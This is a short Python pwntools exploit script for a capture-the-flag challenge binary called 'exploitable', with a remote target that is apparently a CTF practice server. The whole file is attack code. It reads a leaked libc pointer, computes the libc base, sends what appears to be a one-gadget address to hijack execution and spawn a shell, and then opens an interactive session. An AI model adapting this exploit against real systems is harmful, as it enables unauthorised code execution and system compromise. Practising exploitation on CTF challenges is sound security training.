#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./exploitable')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./exploitable')
			libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',26732)
			elf=ELF('exploitable')
			libc=ELF('../../i386libc/x86_libc.so.6')
		
		
		libc_base=u32(io.recv(4))-libc.sym['_IO_2_1_stdout_']
		libc.address=libc_base
		# gdb.attach(io)
		# pause()
		io.sendline(str(libc_base+0x3a80c-0x100000000))


		success(hex(libc_base))
		io.interactive()


	#except Exception as e:
		#raise e
	#else:
		#pass